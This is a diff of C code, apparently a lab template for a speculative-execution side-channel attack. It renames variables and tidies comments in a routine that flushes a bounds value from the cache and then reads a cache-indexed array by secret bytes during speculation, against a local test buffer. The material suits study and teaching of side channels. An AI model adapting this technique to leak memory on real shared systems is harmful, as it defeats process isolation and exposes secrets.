@@ -45,6 +45,7 @@ alloc_memory() {
     scratchpad = mmap_size(sizeof(Array) * 256);
     temp_scratchpad = mmap_size(sizeof(Array) * 256);
     branch_variable = mmap_size(0x1000);
+    
     size[0] = 0x1000;
     array_size = &size[0];
     memset(secret, 97, 100);
@@ -52,7 +53,7 @@ alloc_memory() {
 
 
 // do meltdown; a template..
-int meltdown_logic(int *branch_variable,
+int meltdown_logic(int *idx,
                     Array *cachepad) {
     volatile int i = 0;
 
@@ -60,15 +61,18 @@ int meltdown_logic(int *branch_variable,
 	volatile char k = secret[j];
     }
 
-    // flush branch variable from cache
-    *branch_variable;
+    
+    // flush array size from cache and load index to access into cache
+    *idx;
     _mm_clflush(array_size);
     _mm_mfence();
-    if (*branch_variable < *array_size && *branch_variable >= 0) {
+    
+    if (*idx < *array_size && *idx >= 0) {
         // excute the following line speculatively
         // will access cachepad indexed by secret[idx]
-        i &= cachepad[some_array[*branch_variable]].data[0];
+        i &= cachepad[some_array[*idx]].data[0];
     }
+    
     return i;
 }
 
@@ -77,9 +81,6 @@ int meltdown_logic(int *branch_variable,
 // flush all scratchpad data
 void
 flush_all() {
-    // TODO: flush all from scratchpad
-    // don't forget to run _mm_mfence();
-
     for (int i=0; i<256; i++) {
         _mm_clflush(&scratchpad[i].data[0]);
     }
